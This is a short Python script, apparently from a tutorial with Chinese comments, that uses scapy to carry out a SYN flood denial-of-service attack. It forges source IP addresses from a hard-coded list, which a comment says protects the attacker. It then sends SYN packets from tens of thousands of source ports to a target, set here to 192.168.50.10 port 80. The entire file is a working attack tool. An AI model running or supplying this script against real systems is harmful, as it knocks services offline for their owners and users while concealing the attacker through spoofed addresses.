import os
import random
from scapy.all import *
def synFlood(tgt, dport):
    # 伪造的源IP地址列表，同时也是保护攻击者的一种方式
    srcList = ['201.1.1.2','10.1.1.102','69.1.1.2','125.130.5.199']
    # 从不同的源端口发送
    for sPort in range(1024, 65535):
        # 随机选择主机地址
        index = random.randrange(4)
        # 一个完整的TCP包由一个IP包和TCO包组成
        # 1. 构造IP包，设置源地址src和目的地址dst
        ipLayer = IP(src=srcList[index], dst=tgt)
        ## print("IP layer is " + str(ipLayer))
        # 2. 构造TCP包，设置发送源端口sport和目的源端口dport,flag值设为S表示发送SYN数据包
        tcpLayer = TCP(sport=sPort, dport = dport, flags="S")
        ## print("TCP layer is " + str(tcpLayer))
        # 3. 构造完整TCP包，IP包/TCP包
        packet = ipLayer / tcpLayer
        send(packet)
        print("Sent")
        ## print(sPort)
        
if __name__ == "__main__":
    synFlood("192.168.50.10", 80)